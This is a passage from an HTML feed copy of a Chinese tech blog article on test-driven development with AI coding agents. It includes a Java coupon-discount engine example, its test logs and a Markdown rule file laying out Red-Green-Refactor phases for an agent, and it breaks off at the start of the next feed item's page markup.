        new <span class="hljs-built_in">Coupon</span>().<span class="hljs-built_in">setCondition</span>(<span class="hljs-string">"无门槛5元券"</span>).<span class="hljs-built_in">setDiscountAmount</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"5"</span>)) <span class="hljs-comment">// 满足条件</span>
    );
    
    <span class="hljs-selector-tag">CouponUsageResult</span> <span class="hljs-selector-tag">result</span> = <span class="hljs-selector-tag">CouponEngine</span><span class="hljs-selector-class">.calculateOptimalUsage</span>(order, availableCoupons);
    
    <span class="hljs-comment">// 验证条件判断：只有无门槛券可用</span>
    <span class="hljs-selector-tag">assertEquals</span>(<span class="hljs-number">1</span>, result.<span class="hljs-built_in">getUsedCoupons</span>().<span class="hljs-built_in">size</span>());
    <span class="hljs-selector-tag">assertEquals</span>(<span class="hljs-string">"无门槛5元券"</span>, result.<span class="hljs-built_in">getUsedCoupons</span>().<span class="hljs-built_in">get</span>(<span class="hljs-number">0</span>).<span class="hljs-built_in">getCondition</span>());
    <span class="hljs-selector-tag">assertEquals</span>(new <span class="hljs-built_in">BigDecimal</span>(<span class="hljs-string">"25.00"</span>), result.<span class="hljs-built_in">getFinalAmount</span>());
}
</code></pre>
<p>运行测试：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">[<span class="hljs-keyword">ERROR</span>] testCouponUsageWithBasicStackingRules: 
<span class="hljs-keyword">Class</span> CouponEngine doesn<span class="hljs-comment">'t exist</span>
[<span class="hljs-keyword">ERROR</span>] testCouponMutualExclusionRules:
Method calculateOptimalUsage <span class="hljs-built_in">not</span> found
</code></pre>
<p>红色阶段成功：测试失败，但复杂的业务规则已经通过代码精确表达。</p>
<p>🟢 绿色阶段：AI精确实现</p>
<p>将失败的测试用例提供给AI：“请实现CouponEngine.calculateOptimalUsage方法，让这些测试通过”</p>
<p>AI分析测试用例后，精确理解了复杂的业务规则：</p>
<ol>
<li>券类型包括满减券、打折券、免邮券、新用户券等</li>
<li>不同券有不同的叠加和互斥规则</li>
<li>需要验证使用条件（金额、用户等级、商品类别）</li>
<li>要计算最优的券使用组合</li>
</ol>
<p>AI生成的实现方案：</p>
<pre><code class="hljs language-scss" lang="scss">public class CouponEngine {
    public static CouponUsageResult <span class="hljs-built_in">calculateOptimalUsage</span>(Order order, List&lt;Coupon&gt; availableCoupons) {
        <span class="hljs-comment">// 1. 过滤出满足使用条件的券</span>
        List&lt;Coupon&gt; eligibleCoupons = availableCoupons<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.filter</span>(coupon -&gt; isEligible(order, coupon))
            <span class="hljs-selector-class">.collect</span>(Collectors.toList());
        
        <span class="hljs-comment">// 2. 生成所有可能的券组合（考虑互斥规则）</span>
        List&lt;List&lt;Coupon&gt;&gt; validCombinations = <span class="hljs-built_in">generateValidCombinations</span>(eligibleCoupons);
        
        <span class="hljs-comment">// 3. 计算每种组合的最终优惠，选择最优方案</span>
        return validCombinations<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.map</span>(combination -&gt; calculateResult(order, combination))
            <span class="hljs-selector-class">.min</span>(Comparator.comparing(CouponUsageResult::getFinalAmount))
            <span class="hljs-selector-class">.orElse</span>(new CouponUsageResult(order.getTotalAmount(), Collections<span class="hljs-selector-class">.emptyList</span>()));
    }
    
    private static boolean <span class="hljs-built_in">isEligible</span>(Order order, Coupon coupon) {
        String condition = coupon<span class="hljs-selector-class">.getCondition</span>();
        
        <span class="hljs-comment">// 金额条件检查</span>
        if (condition.contains("满") &amp;&amp; condition<span class="hljs-selector-class">.contains</span>("减")) {
            BigDecimal minAmount = <span class="hljs-built_in">extractMinAmount</span>(condition);
            if (order.getTotalAmount()<span class="hljs-selector-class">.compareTo</span>(minAmount) &lt; <span class="hljs-number">0</span>) return false;
        }
        
        <span class="hljs-comment">// 用户等级检查</span>
        if (condition.contains("VIP") &amp;&amp; !"VIP用户"<span class="hljs-selector-class">.equals</span>(order.getUserLevel())) {
            return false;
        }
        
        <span class="hljs-comment">// 商品类别检查</span>
        if (condition.contains("数码类") &amp;&amp; !<span class="hljs-attribute">order</span><span class="hljs-selector-class">.hasCategory</span>("数码产品")) {
            return false;
        }
        
        return true;
    }
    
    private static List&lt;List&lt;Coupon&gt;&gt; <span class="hljs-built_in">generateValidCombinations</span>(List&lt;Coupon&gt; coupons) {
        List&lt;List&lt;Coupon&gt;&gt; combinations = new ArrayList&lt;&gt;();
        
        <span class="hljs-comment">// 生成所有子集组合</span>
        for (int i = <span class="hljs-number">0</span>; i &lt; Math.pow(<span class="hljs-number">2</span>, coupons.size()); <span class="hljs-selector-tag">i</span>++) {
            List&lt;Coupon&gt; combination = new ArrayList&lt;&gt;();
            for (int j = <span class="hljs-number">0</span>; j &lt; coupons.size(); j++) {
                if ((i &amp; (<span class="hljs-number">1</span> &lt;&lt; j)) != <span class="hljs-number">0</span>) {
                    combination<span class="hljs-selector-class">.add</span>(coupons.get(j));
                }
            }
            
            <span class="hljs-comment">// 检查组合是否符合互斥规则</span>
            if (isValidCombination(combination)) {
                combinations<span class="hljs-selector-class">.add</span>(combination);
            }
        }
        
        return combinations;
    }
    
    private static boolean <span class="hljs-built_in">isValidCombination</span>(List&lt;Coupon&gt; combination) {
        <span class="hljs-comment">// 检查互斥规则</span>
        boolean hasDiscountCoupon = combination<span class="hljs-selector-class">.stream</span>()<span class="hljs-selector-class">.anyMatch</span>(c -&gt; "打折券".equals(c.getType()));
        boolean hasReduceCoupon = combination<span class="hljs-selector-class">.stream</span>()<span class="hljs-selector-class">.anyMatch</span>(c -&gt; "满减券".equals(c.getType()));
        boolean hasNewUserCoupon = combination<span class="hljs-selector-class">.stream</span>()<span class="hljs-selector-class">.anyMatch</span>(c -&gt; "新用户专享".equals(c.getType()));
        
        <span class="hljs-comment">// 新用户券与其他券互斥</span>
        if (hasNewUserCoupon &amp;&amp; combination.size() &gt; <span class="hljs-number">1</span>) {
            return false;
        }
        
        <span class="hljs-comment">// 打折券与满减券互斥</span>
        if (hasDiscountCoupon &amp;&amp; hasReduceCoupon) {
            return false;
        }
        
        return true;
    }
    
    private static CouponUsageResult <span class="hljs-built_in">calculateResult</span>(Order order, List&lt;Coupon&gt; usedCoupons) {
        BigDecimal finalAmount = <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getTotalAmount</span>();
        
        <span class="hljs-comment">// 按照优先级顺序应用优惠</span>
        for (Coupon coupon : usedCoupons) {
            if ("打折券".equals(coupon.getType())) {
                finalAmount = finalAmount<span class="hljs-selector-class">.multiply</span>(coupon.getDiscountRate());
            } else if ("满减券".equals(coupon.getType()) || "无门槛<span class="hljs-number">5</span>元券"<span class="hljs-selector-class">.equals</span>(coupon.getCondition())) {
                finalAmount = finalAmount<span class="hljs-selector-class">.subtract</span>(coupon.getDiscountAmount());
            } else if ("免邮券".equals(coupon.getType())) {
                <span class="hljs-comment">// 免邮券单独处理运费</span>
                finalAmount = finalAmount<span class="hljs-selector-class">.subtract</span>(coupon.getDiscountAmount());
            }
        }
        
        return new <span class="hljs-built_in">CouponUsageResult</span>(finalAmount, usedCoupons);
    }
}
</code></pre>
<p>运行测试：</p>
<pre><code class="hljs language-yaml" lang="yaml">[<span class="hljs-string">INFO</span>] <span class="hljs-attr">Tests run:</span> <span class="hljs-number">3</span><span class="hljs-string">,</span> <span class="hljs-attr">Failures:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Errors:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Skipped:</span> <span class="hljs-number">0</span>
[<span class="hljs-string">INFO</span>] <span class="hljs-string">All</span> <span class="hljs-string">tests</span> <span class="hljs-string">passed!</span>
</code></pre>
<p>绿色阶段成功：测试通过，复杂的业务逻辑完全正确。</p>
<p>🔵 重构阶段：优化代码质量</p>
<p>在测试保护下，对AI生成的代码进行质量优化：</p>
<pre><code class="hljs language-scss" lang="scss">public class CouponEngine {
    <span class="hljs-comment">// 提取常量，增强可读性</span>
    private static final Set&lt;String&gt; MUTUALLY_EXCLUSIVE_TYPES = Set<span class="hljs-selector-class">.of</span>("打折券", "满减券");
    private static final String NEW_USER_COUPON_TYPE = "新用户专享";
    
    public static CouponUsageResult <span class="hljs-built_in">calculateOptimalUsage</span>(Order order, List&lt;Coupon&gt; availableCoupons) {
        if (CollectionUtils.isEmpty(availableCoupons)) {
            return new <span class="hljs-built_in">CouponUsageResult</span>(order.getTotalAmount(), Collections<span class="hljs-selector-class">.emptyList</span>());
        }
        
        <span class="hljs-comment">// 使用策略模式优化条件验证</span>
        List&lt;Coupon&gt; eligibleCoupons = availableCoupons<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.filter</span>(coupon -&gt; CouponValidator.isEligible(order, coupon))
            <span class="hljs-selector-class">.collect</span>(Collectors.toList());
        
        <span class="hljs-comment">// 使用组合算法优化券组合生成</span>
        List&lt;List&lt;Coupon&gt;&gt; validCombinations = CouponCombinator<span class="hljs-selector-class">.generateValidCombinations</span>(eligibleCoupons);
        
        <span class="hljs-comment">// 使用计算引擎优化折扣计算</span>
        return validCombinations<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.map</span>(combination -&gt; DiscountCalculator.calculateResult(order, combination))
            <span class="hljs-selector-class">.min</span>(Comparator.comparing(CouponUsageResult::getFinalAmount))
            <span class="hljs-selector-class">.orElse</span>(new CouponUsageResult(order.getTotalAmount(), Collections<span class="hljs-selector-class">.emptyList</span>()));
    }
}

<span class="hljs-comment">// 职责分离：券验证器</span>
class CouponValidator {
    public static boolean <span class="hljs-built_in">isEligible</span>(Order order, Coupon coupon) {
        return AmountValidator<span class="hljs-selector-class">.validate</span>(order, coupon) &amp;&amp;
               UserLevelValidator<span class="hljs-selector-class">.validate</span>(order, coupon) &amp;&amp;
               CategoryValidator<span class="hljs-selector-class">.validate</span>(order, coupon);
    }
}

<span class="hljs-comment">// 职责分离：券组合器</span>
class CouponCombinator {
    public static List&lt;List&lt;Coupon&gt;&gt; <span class="hljs-built_in">generateValidCombinations</span>(List&lt;Coupon&gt; coupons) {
        return PowerSetGenerator<span class="hljs-selector-class">.generate</span>(coupons)<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.filter</span>(MutualExclusionChecker::isValidCombination)
            <span class="hljs-selector-class">.collect</span>(Collectors.toList());
    }
}

<span class="hljs-comment">// 职责分离：折扣计算器</span>
class DiscountCalculator {
    public static CouponUsageResult <span class="hljs-built_in">calculateResult</span>(Order order, List&lt;Coupon&gt; usedCoupons) {
        <span class="hljs-comment">// 按优先级排序券，确保计算顺序正确</span>
        List&lt;Coupon&gt; sortedCoupons = usedCoupons<span class="hljs-selector-class">.stream</span>()
            <span class="hljs-selector-class">.sorted</span>(Comparator.comparing(CouponPriorityResolver::getPriority))
            <span class="hljs-selector-class">.collect</span>(Collectors.toList());
        
        BigDecimal finalAmount = <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getTotalAmount</span>();
        
        for (Coupon coupon : sortedCoupons) {
            finalAmount = <span class="hljs-built_in">applyCouponDiscount</span>(finalAmount, coupon);
        }
        
        return new <span class="hljs-built_in">CouponUsageResult</span>(finalAmount, usedCoupons);
    }
    
    private static BigDecimal <span class="hljs-built_in">applyCouponDiscount</span>(BigDecimal currentAmount, Coupon coupon) {
        return CouponTypeHandler<span class="hljs-selector-class">.getHandler</span>(coupon.getType())
            <span class="hljs-selector-class">.applyDiscount</span>(currentAmount, coupon);
    }
}
</code></pre>
<p>重构验证：</p>
<pre><code class="hljs language-yaml" lang="yaml">[<span class="hljs-string">INFO</span>] <span class="hljs-attr">Tests run:</span> <span class="hljs-number">3</span><span class="hljs-string">,</span> <span class="hljs-attr">Failures:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Errors:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">Skipped:</span> <span class="hljs-number">0</span>
[<span class="hljs-string">INFO</span>] <span class="hljs-string">重构完成，测试持续通过，代码结构更清晰，职责分离更明确</span>
</code></pre>
<p>协作模式转变：开发者不再需要为如何描述复杂的业务规则而烦恼，现在只需专注于设计精确的测试场景——我们负责定义“做什么”和“预期结果”，而AI则负责实现具体的“怎么做”。这种明确的分工让复杂逻辑的开发变得既可控又高效。</p>
<p>通过这种方式，我们能够确保：</p>
<ol>
<li>需求表达精准无歧义</li>
<li>边界条件全面覆盖</li>
<li>实现过程完全可控</li>
<li>重构过程安全可靠</li>
</ol>
<p>当需要开发新场景时，只需新增测试用例即可，完全不必担心会破坏原有逻辑。这种开发模式不仅提升了效率，更确保了系统的稳定性和可维护性。</p>
<h2 data-id="heading-11">五、实践要点</h2>
<h3 data-id="heading-12">5.1 环境配置</h3>
<p>确保AI Agent能执行<code>mvn test</code>命令</p>
<p>设定明确的行为准则（Rule），让AI能够知道我们现在遵循的开发范式，防止AI为了通过测试"作弊"修改业务代码。一个借助TDD思想驱动代码生成的执行准则如下</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># AI Agent 行为准则：TDD 测试驱动开发</span>

<span class="hljs-section">## 1. 总则</span>

<span class="hljs-section">### 1.1. 概述</span>
为了确保 AI Agent 遵循 TDD（测试驱动开发）的开发模式，Agent 必须严格按照 <span class="hljs-strong">**Red-Green-Refactor**</span> 三个阶段的循环进行开发。在执行每个阶段前，Agent 必须向开发者明确声明其当前所处的阶段。

本准则旨在确保 Agent 遵循正确的 TDD 开发流程，避免跳过关键步骤。

<span class="hljs-section">### 1.2. 环境配置：强制使用指定的 settings.xml</span>
<span class="hljs-strong">**核心要求**</span>: 所有对 <span class="hljs-code">`mvn@ 命令的调用（如 mvn test@, mvn compile@ 等），都**必须**使用 --settings@ (或 -s@) 参数来指定一个自定义的 settings.xml`</span> 文件，以确保能够访问内部的 Maven 仓库。

<span class="hljs-bullet">-</span> <span class="hljs-strong">**命令格式示例**</span>: <span class="hljs-code">`mvn --settings [settings.xml的绝对路径] test`</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**`settings.xml` 文件路径**</span>: <span class="hljs-code">`[settings.xml的绝对路径]`</span>

Agent 在执行任何 Maven 命令前，必须确认此路径已被正确配置和使用。

---

<span class="hljs-section">## 2. TDD 三阶段循环</span>

<span class="hljs-section">### 2.1. 第一阶段：RED (写失败的测试)</span>

<span class="hljs-section">#### 2.1.1. 目标</span>
编写一个<span class="hljs-strong">**必然失败**</span>的测试用例，明确定义即将实现的功能需求。

<span class="hljs-section">#### 2.1.2. 核心准则</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**允许**</span>: Agent 可以在 <span class="hljs-code">`src/test/`</span> 目录下创建新的测试文件或添加新的测试方法
<span class="hljs-bullet">-</span> <span class="hljs-strong">**要求**</span>:
<span class="hljs-bullet">  -</span> 测试必须是失败的（因为对应的实现代码尚未存在或不完整）
<span class="hljs-bullet">  -</span> 一次只测试一个功能点
<span class="hljs-bullet">  -</span> 测试代码要简单清晰
<span class="hljs-bullet">  -</span> 测试名称要明确表达测试意图
<span class="hljs-bullet">-</span> <span class="hljs-strong">**禁止**</span>: Agent <span class="hljs-strong">**不能**</span>修改 <span class="hljs-code">`src/main/`</span> 目录下的任何现有代码
<span class="hljs-bullet">-</span> <span class="hljs-strong">**验证**</span>: 运行测试必须显示红色（失败状态）

<span class="hljs-section">#### 2.1.3. 交互示例</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**开发者提示**</span>: "我需要实现一个计算器的加法功能"
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Agent 回应**</span>: "已激活 <span class="hljs-strong">**RED 阶段**</span>。我将先编写一个失败的测试用例来定义加法功能的需求。"

<span class="hljs-section">### 2.2. 第二阶段：GREEN (让测试通过的最简实现)</span>

<span class="hljs-section">#### 2.2.1. 目标</span>
编写<span class="hljs-strong">**最简单**</span>的实现代码，让当前失败的测试通过。

<span class="hljs-section">#### 2.2.2. 核心准则</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**允许**</span>: Agent 可以创建、修改 <span class="hljs-code">`src/main/`</span> 目录下的代码
<span class="hljs-bullet">-</span> <span class="hljs-strong">**要求**</span>:
<span class="hljs-bullet">  -</span> 优先考虑最简单的实现方式
<span class="hljs-bullet">  -</span> 专注于满足当前测试用例
<span class="hljs-bullet">  -</span> 快速实现功能让测试通过
<span class="hljs-bullet">-</span> <span class="hljs-strong">**禁止**</span>:
<span class="hljs-bullet">  -</span> <span class="hljs-strong">**不能**</span>修改测试代码
<span class="hljs-bullet">  -</span> <span class="hljs-strong">**不考虑**</span>代码质量和性能优化
<span class="hljs-bullet">  -</span> <span class="hljs-strong">**不进行**</span>过度设计
<span class="hljs-bullet">-</span> <span class="hljs-strong">**验证**</span>: 运行测试必须显示绿色（通过状态）

<span class="hljs-section">#### 2.2.3. 交互示例</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Agent 回应**</span>: "已激活 <span class="hljs-strong">**GREEN 阶段**</span>。我将实现最简单的代码来让刚才的测试通过，不考虑优化和设计。"

<span class="hljs-section">### 2.3. 第三阶段：REFACTOR (重构优化)</span>

<span class="hljs-section">#### 2.3.1. 目标</span>
在保持测试通过的前提下，改进代码的设计、质量和可维护性。

<span class="hljs-section">#### 2.3.2. 核心准则</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**允许**</span>: Agent 可以重构 <span class="hljs-code">`src/main/`</span> 目录下的实现代码
<span class="hljs-bullet">-</span> <span class="hljs-strong">**要求**</span>:
<span class="hljs-bullet">  -</span> 改进代码设计和质量
<span class="hljs-bullet">  -</span> 消除重复代码
<span class="hljs-bullet">  -</span> 提高代码可读性和可维护性
<span class="hljs-bullet">  -</span> 每次重构后必须运行测试确保通过
<span class="hljs-bullet">-</span> <span class="hljs-strong">**禁止**</span>:
<span class="hljs-bullet">  -</span> <span class="hljs-strong">**不能**</span>修改测试的行为和期望
<span class="hljs-bullet">  -</span> <span class="hljs-strong">**不能**</span>破坏现有功能
<span class="hljs-bullet">-</span> <span class="hljs-strong">**验证**</span>: 重构过程中和完成后，所有测试必须保持绿色

<span class="hljs-section">#### 2.3.3. 交互示例</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Agent 回应**</span>: "已激活 <span class="hljs-strong">**REFACTOR 阶段**</span>。我将重构代码以提高质量，同时确保所有测试保持通过状态。"

---

<span class="hljs-section">## 3. TDD 最佳实践</span>

<span class="hljs-section">### 3.1. 循环节奏</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**小步快走**</span>: 每个 Red-Green-Refactor 循环应该很短（几分钟到十几分钟）
<span class="hljs-bullet">-</span> <span class="hljs-strong">**频繁验证**</span>: 每个阶段完成后都要运行测试验证
<span class="hljs-bullet">-</span> <span class="hljs-strong">**逐步推进**</span>: 一次只关注一个小功能点

<span class="hljs-section">### 3.2. 测试质量要求</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**快速执行**</span>: 单元测试应该在秒级内完成
<span class="hljs-bullet">-</span> <span class="hljs-strong">**独立性**</span>: 测试之间不应该有依赖关系
<span class="hljs-bullet">-</span> <span class="hljs-strong">**可重复性**</span>: 测试结果应该是确定的和可重复的
<span class="hljs-bullet">-</span> <span class="hljs-strong">**清晰命名**</span>: 测试方法名应明确表达测试意图

<span class="hljs-section">### 3.3. 代码质量保证</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**持续重构**</span>: 在每个循环的 REFACTOR 阶段改进代码
<span class="hljs-bullet">-</span> <span class="hljs-strong">**消除重复**</span>: 遵循 DRY（Don't Repeat Yourself）原则
<span class="hljs-bullet">-</span> <span class="hljs-strong">**保持简洁**</span>: 代码应该简洁明了，易于理解

<span class="hljs-section">### 3.4. 流程控制</span>
Agent 在每个阶段转换时，必须：
<span class="hljs-bullet">1.</span> 明确声明即将进入的阶段
<span class="hljs-bullet">2.</span> 说明当前阶段的具体目标
<span class="hljs-bullet">3.</span> 完成阶段后验证结果
<span class="hljs-bullet">4.</span> 确认是否继续下一个循环
</code></pre>
<h3 data-id="heading-13">5.2 掌握单测语法</h3>
<p>AI擅长基础用例覆盖，但复杂业务场景、边界条件仍有可能需要开发者手动编写。不要完全依赖AI构造用例。</p>
<h3 data-id="heading-14">5.3 选择合适场景与策略</h3>
<p>快速决策法则：</p>
<ul>
<li>简单功能：单个方法，逻辑直观，采用“先实现，后验证”；</li>
<li>复杂业务逻辑：多分支判断、算法计算、状态转换，采用TDD“先验证，后实现”；</li>
<li>存量代码修改：采用“安全网保护”策略；</li>
<li>提示词难以描述需求时：测试用例是最好的需求文档，采用TDD让代码直接表达需求。</li>
</ul>
<h3 data-id="heading-15">5.4 持续维护</h3>
<p>单元测试必须与业务代码演进保持同步。一个过时的、无人维护的测试集，其价值会迅速归零，甚至成为负资产。</p>
<h2 data-id="heading-16">六、结语</h2>
<p>如今，单元测试已被赋予全新的意义——它不再被视为一种“开发负担”，而是进化成为AI Coding时代的“质量引擎”。</p>
<p>我们构建起三重关键保障：</p>
<ul>
<li><strong>策略一</strong>：以客观检验替代主观判断，让AI代码告别“看起来没问题”的错觉；</li>
<li><strong>策略二</strong>：为存量代码筑起防护墙，使修改存量代码安全可控，降低演进风险；</li>
<li><strong>策略三</strong>：用测试作为与AI的沟通语言，精准传递复杂需求与预期。</li>
</ul>
<p>更深层次的变化在于，我们正在重新定义开发者的核心价值：当我们从“思考提示词”转向“思考测试用例”，本质上是从AI代码被动的审查者，转变为了主动的需求设计者与质量掌控者。这不仅加速开发进程，更显著提升代码质量。这正是AI时代中，开发者与智能工具协同进化的优秀范式。</p>
<p>| 关注「美团技术团队」微信公众号，在公众号菜单栏对话框回复【2024年货】、【2023年货】、【2022年货】、【2021年货】、【2020年货】、【2019年货】、【2018年货】、【2017年货】等关键词，可查看美团技术团队历年技术文章合集。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9493cccaa0be4161a6158c0625fd97cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518691&amp;x-signature=NT2JEOZ2ocIEwo2og70f407ctkU%3D" alt="" loading="lazy"/></p>
<p>| 本文系美团技术团队出品，著作权归属美团。欢迎出于分享和交流等非商业目的转载或使用本文内容，敬请注明“内容转载自美团技术团队”。本文未经许可，不得进行商业性转载或者使用。任何商用行为，请发送邮件至 <a href="https://link.juejin.cn?target=mailto%3Atech%40meituan.com" target="_blank" title="mailto:tech@meituan.com" ref="nofollow noopener noreferrer">tech@meituan.com</a> 申请授权。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[10 个 YYDS 的技巧：Google 官方教你用 Nano Banana Pro]]></title>    <link>https://juejin.cn/post/7579917791765266459</link>    <guid>https://juejin.cn/post/7579917791765266459</guid>    <pubDate>2025-12-05T05:53:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579917791765266459" data-draft-id="7579935414422126638" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="10 个 YYDS 的技巧：Google 官方教你用 Nano Banana Pro"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-05T05:53:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            10 个 YYDS 的技巧：Google 官方教你用 Nano Banana Pro
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T05:53:28.000Z" title="Fri Dec 05 2025 05:53:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 